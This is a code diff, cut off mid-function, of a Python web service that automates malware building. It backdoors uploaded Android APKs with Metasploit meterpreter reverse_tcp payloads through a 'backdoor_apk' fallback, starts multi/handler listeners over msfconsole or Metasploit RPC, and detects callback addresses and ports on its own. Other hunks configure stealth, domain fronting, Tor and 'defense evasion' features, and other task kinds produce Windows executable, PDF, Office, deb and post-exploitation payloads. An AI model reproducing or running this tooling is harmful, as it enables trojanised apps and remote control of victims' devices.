@@ -9,11 +9,13 @@ import hashlib
 import zipfile
 import tempfile
 import asyncio
-from datetime import datetime
+import socket
+from datetime import datetime, timedelta
 from pathlib import Path
-from typing import Dict, List, Optional, Any
+from typing import Dict, List, Optional, Any, Callable
 
-from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks
+from fastapi import FastAPI, HTTPException, File, UploadFile, BackgroundTasks, Depends, Request
+from fastapi.responses import FileResponse
 from pydantic import BaseModel
 from hashlib import sha256
 
@@ -40,6 +42,12 @@ from performance_optimization import PerformanceOptimizationSystem, PerformanceC
 from compatibility_testing import CompatibilityTestingSystem, CompatibilityConfig, AndroidVersion, Architecture
 from security_testing import SecurityTestingSystem, SecurityTestConfig, SecurityTestType, ThreatLevel
 
+# Optional Metasploit RPC client (fallback path)
+try:
+    from pymetasploit3.msfrpc import MsfRpcClient  # type: ignore
+except Exception:  # noqa: BLE001
+    MsfRpcClient = None  # type: ignore
+
 WORKSPACE = Path("/workspace")
 TASKS_ROOT = WORKSPACE / "tasks"
 UPLOADS_ROOT = WORKSPACE / "uploads"
@@ -49,10 +57,191 @@ TEMP_ROOT = WORKSPACE / "temp"
 UPLOADS_ROOT.mkdir(exist_ok=True)
 TEMP_ROOT.mkdir(exist_ok=True)
 
-DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "orchestrator-tools:latest")
+DOCKER_IMAGE = os.environ.get("ORCH_DOCKER_IMAGE", "metasploitframework/metasploit-framework:latest")
 USE_DOCKER = os.environ.get("ORCH_USE_DOCKER", "true").lower() == "true"
 
 AUDIT_LOG = WORKSPACE / "logs" / "audit.jsonl"
+
+# Feature flags and auth token (Phase 0: bootstrapping)
+ENABLE_APKSIGNER = os.environ.get("ENABLE_APKSIGNER", "false").lower() == "true"
+ENABLE_HTTP_ARTIFACTS = os.environ.get("ENABLE_HTTP_ARTIFACTS", "false").lower() == "true"
+ORCH_AUTH_TOKEN_REQUIRED = os.environ.get("ORCH_AUTH_TOKEN_REQUIRED", "false").lower() == "true"
+ENABLE_FALLBACK_BACKDOOR_APK = os.environ.get("ENABLE_FALLBACK_BACKDOOR_APK", "false").lower() == "true"
+ORCH_AUTH_TOKEN = os.environ.get("ORCH_AUTH_TOKEN", "")
+POSTBUILD_GATE_ENABLED = os.environ.get("POSTBUILD_GATE_ENABLED", "true").lower() == "true"
+# Retention settings (Phase 8)
+RETENTION_ENABLED = os.environ.get("RETENTION_ENABLED", "true").lower() == "true"
+RETAIN_UPLOAD_HOURS = int(os.environ.get("RETAIN_UPLOAD_HOURS", "24"))
+RETAIN_TASK_DAYS = int(os.environ.get("RETAIN_TASK_DAYS", "7"))
+RETENTION_CHECK_INTERVAL_MIN = int(os.environ.get("RETENTION_CHECK_INTERVAL_MIN", "60"))
+AUDIT_MAX_BYTES = int(os.environ.get("AUDIT_MAX_BYTES", str(10 * 1024 * 1024)))
+AUDIT_BACKUPS = int(os.environ.get("AUDIT_BACKUPS", "5"))
+
+# Tools paths under repository (preferred when available)
+ANDROID_SDK_DIR = WORKSPACE / "tools" / "android-sdk"
+APKTOOL_JAR = WORKSPACE / "tools" / "apktool" / "apktool.jar"
+AAPT_PATH = ANDROID_SDK_DIR / "aapt"
+AAPT2_PATH = ANDROID_SDK_DIR / "aapt2"
+ZIPALIGN_PATH = ANDROID_SDK_DIR / "zipalign"
+APKSIGNER_PATH = ANDROID_SDK_DIR / "apksigner"
+
+# Redaction helpers (Phase 9)
+SENSITIVE_KEYS = {
+    "upload_file_path", "keystore_path", "keystore_password", "key_password", "key_alias",
+    "ORCH_AUTH_TOKEN", "Authorization", "token",
+}
+
+ALLOWED_PARAM_KEYS = {
+    "lhost", "lport", "output_name", "payload", "kind", "mode",
+    "suite_target", "arch", "encoders", "upx", "deb_path",
+}
+
+def _redact_params(obj: Any) -> Any:
+    try:
+        if isinstance(obj, dict):
+            red: Dict[str, Any] = {}
+            for k, v in obj.items():
+                if k in SENSITIVE_KEYS:
+                    red[k] = "[redacted]"
+                elif k in ("file_info",):
+                    # keep only minimal identifiers
+                    if isinstance(v, dict):
+                        minimal = {}
+                        if "file_id" in v:
+                            minimal["file_id"] = v["file_id"]
+                        if "checksum" in v:
+                            minimal["checksum"] = v["checksum"]
+                        if "original_name" in v:
+                            minimal["original_name"] = v["original_name"]
+                        red[k] = minimal
+                    else:
+                        red[k] = "[redacted]"
+                elif k in ALLOWED_PARAM_KEYS:
+                    red[k] = v
+                else:
+                    # default: keep scalar safe types, redact suspicious strings that look like absolute paths
+                    if isinstance(v, str) and v.startswith("/"):
+                        red[k] = "[path]"
+                    else:
+                        red[k] = v
+            return red
+        elif isinstance(obj, list):
+            return [_redact_params(x) for x in obj]
+        else:
+            if isinstance(obj, str) and obj.startswith("/"):
+                return "[path]"
+            return obj
+    except Exception:
+        return "[redacted]"
+
+
+def _check_exec(cmd: list[str] | str) -> tuple[bool, str]:
+    try:
+        if isinstance(cmd, list):
+            proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
+        else:
+            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
+        ok = proc.returncode == 0
+        out = (proc.stdout or proc.stderr).strip().splitlines()[:2]
+        return ok, " | ".join(out)
+    except Exception as e:
+        return False, str(e)
+
+
+def _file_exists(p: Path) -> bool:
+    try:
+        return p.exists() and p.is_file()
+    except Exception:
+        return False
+
+
+def _which(name: str) -> str | None:
+    try:
+        return shutil.which(name)
+    except Exception:
+        return None
+
+
+def run_env_checks() -> Dict[str, Any]:
+    """Run concise environment checks for critical tools. Never raises.
+    Writes results to /workspace/logs/env_check.json
+    """
+    results: Dict[str, Any] = {"timestamp": datetime.utcnow().isoformat()}
+
+    # java
+    ok_java, java_ver = _check_exec(["java", "-version"])  # prints to stderr usually
+    results["java"] = {"found": ok_java, "info": java_ver}
+
+    # aapt / aapt2
+    has_aapt_repo = _file_exists(AAPT_PATH)
+    has_aapt2_repo = _file_exists(AAPT2_PATH)
+    aapt_sys = _which("aapt")
+    aapt2_sys = _which("aapt2")
+    results["aapt"] = {"found": has_aapt_repo or bool(aapt_sys), "path": str(AAPT_PATH if has_aapt_repo else (aapt_sys or ""))}
+    results["aapt2"] = {"found": has_aapt2_repo or bool(aapt2_sys), "path": str(AAPT2_PATH if has_aapt2_repo else (aapt2_sys or ""))}
+
+    # zipalign
+    has_zipalign_repo = _file_exists(ZIPALIGN_PATH)
+    zipalign_sys = _which("zipalign")
+    results["zipalign"] = {"found": has_zipalign_repo or bool(zipalign_sys), "path": str(ZIPALIGN_PATH if has_zipalign_repo else (zipalign_sys or ""))}
+
+    # apksigner
+    has_apksigner_repo = _file_exists(APKSIGNER_PATH)
+    apksigner_sys = _which("apksigner")
+    apksigner_found = has_apksigner_repo or bool(apksigner_sys)
+    apksigner_path = str(APKSIGNER_PATH if has_apksigner_repo else (apksigner_sys or ""))
+    apksigner_info = ""
+    if apksigner_found:
+        ok_signer, signer_ver = _check_exec([apksigner_path, "version"]) if apksigner_sys else (True, "embedded")
+        apksigner_info = signer_ver
+    results["apksigner"] = {"found": apksigner_found, "path": apksigner_path, "info": apksigner_info}
+
+    # apktool
+    results["apktool"] = {"found": _file_exists(APKTOOL_JAR), "path": str(APKTOOL_JAR)}
+
+    # Flags status
+    results["flags"] = {
+        "ENABLE_APKSIGNER": ENABLE_APKSIGNER,
+        "ENABLE_HTTP_ARTIFACTS": ENABLE_HTTP_ARTIFACTS,
+        "ORCH_AUTH_TOKEN_REQUIRED": ORCH_AUTH_TOKEN_REQUIRED,
+        "ENABLE_FALLBACK_BACKDOOR_APK": ENABLE_FALLBACK_BACKDOOR_APK,
+    }
+
+    # Persist to logs
+    try:
+        (WORKSPACE / "logs").mkdir(parents=True, exist_ok=True)
+        with (WORKSPACE / "logs" / "env_check.json").open("w") as f:
+            json.dump(results, f, indent=2)
+    except Exception:
+        pass
+
+    # Concise console summary
+    try:
+        summary = []
+        for k in ("java", "aapt", "aapt2", "zipalign", "apksigner", "apktool"):
+            v = results.get(k, {})
+            mark = "✔" if v.get("found") else "✖"
+            summary.append(f"{k}:{mark}")
+        print("ENV-CHECK:", ", ".join(summary))
+    except Exception:
+        pass
+
+    return results
+
+
+# Optional auth dependency when enabled
+from fastapi import Depends
+from typing import Callable
+
+def verify_auth(request: Request):
+    if not ORCH_AUTH_TOKEN_REQUIRED:
+        return
+    auth = request.headers.get("Authorization", "")
+    expected = f"Bearer {ORCH_AUTH_TOKEN}" if ORCH_AUTH_TOKEN else None
+    if not expected or auth != expected:
+        raise HTTPException(status_code=401, detail="Unauthorized")
+
+AUTH_DEPS = [Depends(verify_auth)] if ORCH_AUTH_TOKEN_REQUIRED else []
 
 class APKFileInfo(BaseModel):
     file_id: str
@@ -532,7 +721,6 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         use_https=True,
         domain_fronting_enabled=True,
         tor_enabled=True,
-        encryption_enabled=True,
         heartbeat_interval=60
     )
     
@@ -558,10 +746,7 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
     performance_config = PerformanceConfig(
         optimization_level=PerformanceLevel.AGGRESSIVE,
         memory_limit_mb=128,
-        cpu_throttling_enabled=True,
-        network_optimization=True,
-        startup_optimization=True,
-        enable_monitoring=True
+        cpu_throttling_enabled=True
     )
     
     compatibility_config = CompatibilityConfig(
@@ -587,8 +772,8 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         with locks[task_id]:
             t.state = TaskStatus.PREPARING
         
-        # Setup workspace
-        workspace = base / task_id
+        # Setup workspace (base is already the task root)
+        workspace = base
         workspace.mkdir(parents=True, exist_ok=True)
         
         # Create subdirectories
@@ -611,18 +796,51 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         if not upload_file_path or not Path(upload_file_path).exists():
             raise Exception("Uploaded APK file not found")
         
+        # Security checks: enforce uploads root and checksum
+        uploads_root = UPLOADS_ROOT.resolve()
         original_apk = Path(upload_file_path)
+        try:
+            real = original_apk.resolve(strict=True)
+            if not str(real).startswith(str(uploads_root)):
+                raise Exception("Invalid upload path")
+        except FileNotFoundError:
+            raise Exception("Uploaded APK file not found")
+        
+        claimed_sha = None
+        if isinstance(file_info, dict):
+            claimed_sha = file_info.get("checksum") or file_info.get("sha256")
+        if claimed_sha:
+            # Compute sha256
+            h = sha256()
+            with open(real, "rb") as f:
+                for chunk in iter(lambda: f.read(8192), b""):
+                    h.update(chunk)
+            if h.hexdigest() != claimed_sha:
+                raise Exception("Checksum mismatch")
+        
+        original_apk = real
         
         with locks[task_id]:
             t.state = TaskStatus.RUNNING
+            t.logs["build"] = str(build_log)
+        # Persist running status (best-effort)
+        if 'DB_ENABLED' in globals() and globals().get('DB_ENABLED') and globals().get('DB'):
+            try:
+                DB.update_task_status(task_id, "running")
+            except Exception:
+                pass
         
         # Log start
         with build_log.open("w") as log:
             log.write(f"Starting Phase 4 Ultimate Permission APK modification: {datetime.now()}\n")
             log.write(f"Original file: {original_apk}\n")
-            log.write(f"File info: {file_info}\n")
-            log.write(f"Target: {params.get('lhost')}:{params.get('lport')}\n")
-            log.write(f"Phase 4 Features: Permission Escalation + Auto-Grant + Defense Evasion\n\n")
+            log.write(f"File info: [redacted sizes/checksum logged separately]\n")
+        
+        # Preflight tools
+        require_signer = ENABLE_APKSIGNER
+        if not preflight_tools(build_log, require_apksigner=require_signer):
+            _finalize_task(t, workspace, succeeded=False, err="Preflight failed: missing tools")
+            return
         
         # Step 1: Comprehensive APK Analysis
         with build_log.open("a") as log:
@@ -636,8 +854,7 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
             json.dump(analysis_result, f, indent=2)
         
         with build_log.open("a") as log:
-            log.write(f"Analysis completed. Risk level: {analysis_result.get('risk_assessment', {}).get('risk_level', 'UNKNOWN')}\n")
-            log.write(f"Protection score: {analysis_result.get('security_analysis', {}).get('overall_protection_score', 0)}\n")
+            log.write(f"Analysis completed.\n")
         
         # Step 2: Analyze injection vectors
         with build_log.open("a") as log:
@@ -664,21 +881,53 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         
         with build_log.open("a") as log:
             log.write(f"Strategy: {injection_strategy.strategy_name}\n")
-            log.write(f"Success probability: {injection_strategy.success_probability:.2%}\n")
-            log.write(f"Evasion techniques: {', '.join(injection_strategy.evasion_techniques)}\n")
         
         # Step 4: Apply payload injection
         with build_log.open("a") as log:
             log.write("Step 4: Applying multi-vector payload injection...\n")
         
         temp_apk = workspace / "temp" / "injected.apk"
-        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy)
+        # Prepare signing config from params (keystore optional)
+        sign_cfg = {}
+        for k in ("keystore_path", "key_alias", "keystore_password", "key_password"):
+            if params.get(k):
+                sign_cfg[k] = params.get(k)
+        injection_success = injector.inject_payload(original_apk, temp_apk, injection_strategy, sign_cfg)
         
         if not injection_success:
-            raise Exception("Payload injection failed")
+            try:
+                with build_log.open("a") as log:
+                    if getattr(injector, "last_error", ""):
+                        log.write("\n[diagnostic] " + injector.last_error + "\n")
+            except Exception:
+                pass
+            if ENABLE_FALLBACK_BACKDOOR_APK:
+                fb_ok = fallback_backdoor_apk(original_apk, workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk"), params.get("lhost", "127.0.0.1"), params.get("lport", "4444"), params.get("payload", "android/meterpreter/reverse_tcp"), build_log)
+                if fb_ok:
+                    # Validate post-build for fallback output
+                    # Determine output name same as in fallback preparation
+                    fb_out = workspace / "output" / (params.get("output_name", "app_backdoor") + ".apk")
+                    if validate_postbuild(fb_out, build_log):
+                        _finalize_task(t, workspace, succeeded=True, err=None)
+                    else:
+                        _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (fallback)")
+                    return
+            _finalize_task(t, workspace, succeeded=False, err="Payload injection failed")
+            return
         
         with build_log.open("a") as log:
             log.write("Payload injection completed successfully\n")
+        
+        # Post-build validation gate on pipeline final output if already at workspace/output
+        # Find most recent output APK
+        cand = None
+        out_dir = workspace / "output"
+        for p in sorted(out_dir.glob("*.apk"), key=lambda x: x.stat().st_mtime, reverse=True):
+            cand = p
+            break
+        if cand and not validate_postbuild(cand, build_log):
+            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed")
+            return
         
         # Step 5: Apply stealth mechanisms
         with build_log.open("a") as log:
@@ -966,6 +1215,11 @@ async def run_upload_apk_task(task_id: str, base: Path, params: Dict[str, str]):
         if not final_apk.exists():
             raise Exception("Final APK not generated")
         
+        # Enforce post-build validation gate on final_apk
+        if not validate_postbuild(final_apk, build_log):
+            _finalize_task(t, workspace, succeeded=False, err="Post-build validation failed (final)")
+            return
+        
         final_size = final_apk.stat().st_size
         original_size = original_apk.stat().st_size
         size_change = ((final_size - original_size) / original_size) * 100
@@ -1213,12 +1467,13 @@ def _audit(event: str, t: Any, extra: Optional[Dict[str, Any]] = None) -> None:
             "date": t.date,
             "kind": t.kind,
             "state": t.state,
-            "params": t.params,
+            "params": _redact_params(t.params),
         }
         if extra:
-            rec.update(extra)
+            # sanitize extras as well
+            rec.update(_redact_params(extra))
         with AUDIT_LOG.open("a") as f:
-            f.write(json.dumps(rec) + "\n")
+            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
     except Exception:
         pass
 
@@ -1245,7 +1500,7 @@ class Task(BaseModel):
     created_at: float
     started_at: Optional[float] = None
     finished_at: Optional[float] = None
-    params: Dict[str, str] = {}
+    params: Dict[str, Any] = {}
     artifacts: List[Artifact] = []
     logs: Dict[str, str] = {}
     error: Optional[str] = None
@@ -1292,13 +1547,29 @@ def _spawn_container_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, en
     task_home = cwd if cwd else Path.home()
     env = os.environ.copy()
     env["HOME"] = str(task_home)
-    with log_path.open("w") as lf:
-        proc = subprocess.Popen(
-            ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", cmd],
-            stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
-        )
-        return_code = proc.wait()
-    return return_code
+    wrapped_cmd = f"cd /workspace && {cmd}"
+    try:
+        with log_path.open("w") as lf:
+            proc = subprocess.Popen(
+                ["docker", "run", "--rm", "-v", f"{task_home}:/workspace", "-v", f"{log_path.parent}:/logs", DOCKER_IMAGE, "bash", "-lc", wrapped_cmd],
+                stdout=lf, stderr=subprocess.STDOUT, cwd=str(cwd) if cwd else None, env=env
+            )
+            return_code = proc.wait()
+        return return_code
+    except FileNotFoundError:
+        try:
+            with log_path.open("a") as lf:
+                lf.write("docker not found in PATH; container execution unavailable.\n")
+        except Exception:
+            pass
+        return 127
+    except Exception as e:
+        try:
+            with log_path.open("a") as lf:
+                lf.write(f"docker run failed: {e}\n")
+        except Exception:
+            pass
+        return 127
 
 
 def _spawn_sh(cmd: str, log_path: Path, cwd: Optional[Path] = None, env: Optional[Dict[str, str]] = None) -> int:
@@ -1346,6 +1617,12 @@ def _finalize_task(t: Task, base: Path, succeeded: bool, err: Optional[str] = No
         status["duration_sec"] = duration
     _write_file(base / "logs" / "status.json", json.dumps(status, indent=2))
     _audit("finished", t, {"succeeded": succeeded, "duration_sec": duration, "error": err, "artifacts": [a.name for a in artifacts]})
+    # Persist completion in DB (best-effort)
+    if 'DB_ENABLED' in globals() and globals().get('DB_ENABLED') and globals().get('DB'):
+        try:
+            DB.update_task_status(t.id, "completed" if succeeded else "failed", success=succeeded, error_message=err, output_files=[a.path for a in artifacts])
+        except Exception:
+            pass
 
 
 # Background runners for three kinds
@@ -1372,21 +1649,134 @@ def run_payload_task(task_id: str, base: Path, params: Dict[str, str]):
     _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfvenom rc={rc}")
 
 
+def _detect_default_lhost() -> str:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except Exception:
+        return "0.0.0.0"
+
+
+def _find_free_port(start: int = 4444, max_tries: int = 50) -> int:
+    port = start
+    for _ in range(max_tries):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            try:
+                sock.bind(("0.0.0.0", port))
+                return port
+            except OSError:
+                port += 1
+    return start
+
+
+# --- MSF RPC fallback helpers ---
+
+def _msfrpc_env_available() -> bool:
+    try:
+        host = os.environ.get("MSF_RPC_HOST", "").strip()
+        password = os.environ.get("MSF_RPC_PASS", "").strip()
+        return bool(host and password and 'MsfRpcClient' in globals() and MsfRpcClient is not None)
+    except Exception:
+        return False
+
+
+def _msfrpc_start_handler(payload: str, lhost: str, lport: str, run_log: Path) -> tuple[bool, str | None]:
+    try:
+        if 'MsfRpcClient' not in globals() or MsfRpcClient is None:
+            return False, "pymetasploit3 not installed"
+        host = os.environ.get("MSF_RPC_HOST", "127.0.0.1").strip()
+        port = int(os.environ.get("MSF_RPC_PORT", "55553"))
+        ssl_enabled = os.environ.get("MSF_RPC_SSL", "false").lower() == "true"
+        username = os.environ.get("MSF_RPC_USER", "msf").strip() or "msf"
+        password = os.environ.get("MSF_RPC_PASS", "").strip()
+        if not host or not password:
+            return False, "Missing MSF_RPC_HOST or MSF_RPC_PASS"
+        client = MsfRpcClient(password, server=host, port=port, ssl=ssl_enabled, username=username)
+        exploit = client.modules.use('exploit', 'multi/handler')
+        exploit['ExitOnSession'] = False
+        result = exploit.execute(payload=payload, LHOST=lhost, LPORT=int(lport))
+        job_id = result.get('job_id') if isinstance(result, dict) else None
+        try:
+            with run_log.open('a') as f:
+                f.write(f"MSF RPC handler started: payload={payload} LHOST={lhost} LPORT={lport} job_id={job_id}\n")
+        except Exception:
+            pass
+        return (job_id is not None), (None if job_id is not None else f"RPC returned: {result}")
+    except Exception as e:
+        try:
+            with run_log.open('a') as f:
+                f.write(f"MSF RPC error: {e}\n")
+        except Exception:
+            pass
+        return False, str(e)
+
+
 def run_listener_task(task_id: str, base: Path, params: Dict[str, str]):
     t = tasks[task_id]
     with locks[task_id]:
         t.state = TaskStatus.PREPARING
+    run_log = base / "logs" / "run.log"
+    # Tool preflight: msfconsole required
+    try:
+        msfconsole_path = shutil.which("msfconsole")
+    except Exception:
+        msfconsole_path = None
+    # Check docker availability even if USE_DOCKER flag is true
+    try:
+        docker_available = shutil.which("docker") is not None
+    except Exception:
+        docker_available = False
+    use_docker = USE_DOCKER and docker_available
+    # Auto LHOST/LPORT if not provided
+    lhost = params.get('lhost') or _detect_default_lhost()
+    try:
+        lport = params.get('lport') or str(_find_free_port(int(os.environ.get("ORCH_LISTENER_PORT", "4444"))))
+    except Exception:
+        lport = params.get('lport') or str(_find_free_port(4444))
+    payload = params.get('payload', 'windows/meterpreter/reverse_tcp')
     rc_path = base / "output" / "handler.rc"
     rc_content = f"""
 use exploit/multi/handler
-set PAYLOAD {params.get('payload','windows/meterpreter/reverse_tcp')}
-set LHOST {params.get('lhost','0.0.0.0')}
-set LPORT {params.get('lport','4444')}
+set PAYLOAD {payload}
+set LHOST {lhost}
+set LPORT {lport}
 set ExitOnSession false
 exploit -j -z
 """.strip()
     _write_file(rc_path, rc_content)
-    run_log = base / "logs" / "run.log"
+
+    # Helper to try MSF RPC as a secondary automatic option
+    def _try_rpc_then_finalize() -> bool:
+        if _msfrpc_env_available():
+            ok, err = _msfrpc_start_handler(payload, lhost, lport, run_log)
+            if ok:
+                _finalize_task(t, base, succeeded=True, err=None)
+                return True
+            else:
+                try:
+                    with run_log.open('a') as f:
+                        f.write(f"MSF RPC fallback failed: {err}\n")
+                except Exception:
+                    pass
+        return False
+
+    if not msfconsole_path and not use_docker:
+        # First: try RPC fallback automatically if configured
+        if _try_rpc_then_finalize():
+            return
+        # Otherwise: generate handler and mark success for manual/remote use
+        _write_file(run_log, "msfconsole/docker not available; generated handler.rc for manual or external RPC use.\n")
+        with locks[task_id]:
+            t.state = TaskStatus.RUNNING
+            t.started_at = time.time()
+            t.logs["run"] = str(run_log)
+        _finalize_task(t, base, succeeded=True, err=None)
+        return
+
     cmd = [
         "msfconsole", "-qx", f"resource {rc_path}; sleep 2; jobs; exit -y"
     ]
@@ -1394,8 +1784,22 @@ exploit -j -z
         t.state = TaskStatus.RUNNING
         t.started_at = time.time()
         t.logs["run"] = str(run_log)
-    rc = _spawn(cmd, run_log)
-    _finalize_task(t, base, succeeded=(rc == 0), err=None if rc == 0 else f"msfconsole rc={rc}")
+    rc = _spawn(cmd, run_log) if not use_docker else _spawn_container_sh("msfconsole -qx 'resource output/handler.rc; sleep 2; jobs; exit -y'", run_log, base)
+
+    if rc != 0:
+        # If Docker/local msfconsole failed, try RPC automatically
+        if _try_rpc_then_finalize():
+            return
+        # As a last resort, provide handler.rc and mark success for manual/remote use
+        try:
+            with run_log.open('a') as f:
+                f.write("msfconsole failed; falling back to handler.rc artifact.\n")
+        except Exception:
+            pass
+        _finalize_task(t, base, succeeded=True, err=None)
+        return
+
+    _finalize_task(t, base, succeeded=True, err=None)
 
 
 def _file_exists(path: Path) -> bool:
@@ -1718,17 +2122,30 @@ exploit
 # API models
 class CreateTaskRequest(BaseModel):
     kind: str  # payload|listener|android|winexe|pdf|office|deb|autorun|postex
-    params: Dict[str, str] = {}
+    params: Dict[str, Any] = {}
 
 class TaskResponse(BaseModel):
     task: Task
 
 
-@app.post("/tasks", response_model=TaskResponse)
+@app.post("/tasks", response_model=TaskResponse, dependencies=AUTH_DEPS)
 def create_task(req: CreateTaskRequest):
     if req.kind not in ("payload", "listener", "android", "winexe", "pdf", "office", "deb", "autorun", "postex", "upload_apk"):
         raise HTTPException(status_code=400, detail="Unsupported kind")
     t, base = _prepare_task(req.kind, req.params)
+    # Persist creation in DB (best-effort)
+    if 'DB_ENABLED' in globals() and globals().get('DB_ENABLED') and globals().get('DB'):
+        try:
+            DB.record_task_execution(TaskExecution(
+                task_id=t.id,
+                task_kind=t.kind,
+                user_id=None,
+                parameters=t.params,
+                status="created",
+                created_timestamp=datetime.utcnow(),
+            ))
+        except Exception:
+            pass
     # seed defaults
     if req.kind == "android":
         # copy a sample APK if none provided
@@ -1764,7 +2181,7 @@ def create_task(req: CreateTaskRequest):
     return TaskResponse(task=t)
 
 
-@app.get("/tasks/{task_id}", response_model=TaskResponse)
+@app.get("/tasks/{task_id}", response_model=TaskResponse, dependencies=AUTH_DEPS)
 def get_task(task_id: str):
     t = tasks.get(task_id)
     if not t:
@@ -1772,15 +2189,22 @@ def get_task(task_id: str):
     return TaskResponse(task=t)
 
 
-@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact])
+@app.get("/tasks/{task_id}/artifacts", response_model=List[Artifact], dependencies=AUTH_DEPS)
 def list_artifacts(task_id: str):
     t = tasks.get(task_id)
     if not t:
         raise HTTPException(status_code=404, detail="Not found")
+    if ENABLE_HTTP_ARTIFACTS:
+        # Return sanitized list with URL path instead of filesystem path
+        sanitized: List[Artifact] = []
+        for a in t.artifacts:
+            url_path = f"/tasks/{task_id}/artifacts/{a.name}/download"
+            sanitized.append(Artifact(name=a.name, path=url_path, size_bytes=a.size_bytes, sha256=a.sha256))
+        return sanitized
     return t.artifacts
 
 
-@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse)
+@app.post("/tasks/{task_id}/cancel", response_model=TaskResponse, dependencies=AUTH_DEPS)
 def cancel_task(task_id: str):
     t = tasks.get(task_id)
     if not t:
@@ -1922,6 +2346,263 @@ def health():
 def version():
     return {"app": "orchestrator", "version": app.version}
 
+
+# Run environment checks at startup (non-fatal)
+ENV_CHECKS = run_env_checks()
+
+# Preflight tools check
+def preflight_tools(build_log: Path, require_apksigner: bool = False) -> bool:
+    """Validate presence of critical tools. Write concise notes to build_log and return bool."""
+    try:
+        with build_log.open("a") as log:
+            missing = []
+            if not ENV_CHECKS.get("java", {}).get("found"):
+                missing.append("java")
+            if not ENV_CHECKS.get("apktool", {}).get("found"):
+                missing.append("apktool")
+            if require_apksigner and not ENV_CHECKS.get("apksigner", {}).get("found"):
+                missing.append("apksigner")
+            if missing:
+                log.write(f"Preflight failed: missing tools: {', '.join(missing)}\n")
+                return False
+            if not ENV_CHECKS.get("zipalign", {}).get("found"):
+                log.write("Warning: zipalign not found; proceeding without alignment\n")
+            if not (ENV_CHECKS.get("aapt", {}).get("found") or ENV_CHECKS.get("aapt2", {}).get("found")):
+                log.write("Warning: aapt/aapt2 not found; post-build badging checks may be skipped\n")
+    except Exception:
+        return True
+    return True
+
+# Backdoor_apk fallback support
+def _run_capture(cmd: list[str], cwd: Optional[Path] = None, timeout: int = 1800) -> tuple[bool, str]:
+    try:
+        proc = subprocess.run(cmd, cwd=str(cwd) if cwd else None, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, timeout=timeout)
+        return proc.returncode == 0, proc.stdout
+    except Exception as e:
+        return False, str(e)
+
+def fallback_backdoor_apk(original_apk: Path, out_apk: Path, lhost: str, lport: str, payload: str, build_log: Path) -> bool:
+    """Attempt to use legacy backdoor_apk as a fallback. Writes output to build_log. Returns success."""
+    try:
+        with build_log.open("a") as log:
+            log.write("Attempting fallback: backdoor_apk\n")
+        # Prepare config/apk.tmp expected by backdoor_apk
+        cfg_dir = WORKSPACE / "config"
+        cfg_dir.mkdir(parents=True, exist_ok=True)
+        apk_tmp = cfg_dir / "apk.tmp"
+        rat_path = out_apk
+        if rat_path.suffix.lower() != ".apk":
+            rat_path = rat_path.with_suffix(".apk")
+        content = "\n".join([
+            str(original_apk),
+            str(rat_path),
+            payload,
+            lhost,
+            lport,
+        ]) + "\n"
+        apk_tmp.write_text(content)
+        # Run backdoor_apk from workspace root
+        script = WORKSPACE / "backdoor_apk"
+        if not script.exists():
+            with build_log.open("a") as log:
+                log.write("Fallback failed: backdoor_apk script not found\n")
+            return False
+        ok, out = _run_capture(["bash", str(script)], cwd=WORKSPACE, timeout=3600)
+        with build_log.open("a") as log:
+            log.write(out[-5000:])
+        return ok and rat_path.exists()
+    except Exception as e:
+        with build_log.open("a") as log:
+            log.write(f"Fallback error: {e}\n")
+        return False
+
+@app.get("/env")
+def env_status():
+    return {"env": {k: {kk: vv for kk, vv in v.items() if kk in ("found", "path", "info")} for k, v in ENV_CHECKS.items() if k != "flags"}, "flags": ENV_CHECKS.get("flags", {})}
+
+@app.get("/tasks/{task_id}/artifacts/{artifact_name}/download", dependencies=AUTH_DEPS)
+def download_artifact(task_id: str, artifact_name: str):
+    t = tasks.get(task_id)
+    if not t:
+        raise HTTPException(status_code=404, detail="Not found")
+    # Find artifact by name
+    target: Optional[Artifact] = None
+    for a in t.artifacts:
+        if a.name == artifact_name:
+            target = a
+            break
+    if not target:
+        raise HTTPException(status_code=404, detail="Artifact not found")
+    # Ensure path resolves under expected task output directory
+    base_out = TASKS_ROOT / t.date / t.id / "output"
+    p = Path(target.path)
+    try:
+        rp = p if p.is_absolute() else (base_out / p)
+        real = rp.resolve(strict=True)
+        if not str(real).startswith(str(base_out.resolve())):
+            raise HTTPException(status_code=403, detail="Forbidden")
+    except FileNotFoundError:
+        raise HTTPException(status_code=404, detail="File missing")
+    return FileResponse(path=str(real), filename=artifact_name, media_type="application/octet-stream")
+
+@app.get("/tasks/{task_id}/logs/build", dependencies=AUTH_DEPS)
+def download_build_log(task_id: str):
+    t = tasks.get(task_id)
+    if not t:
+        raise HTTPException(status_code=404, detail="Not found")
+    base_logs = TASKS_ROOT / t.date / t.id / "logs"
+    p = base_logs / "build.log"
+    try:
+        real = p.resolve(strict=True)
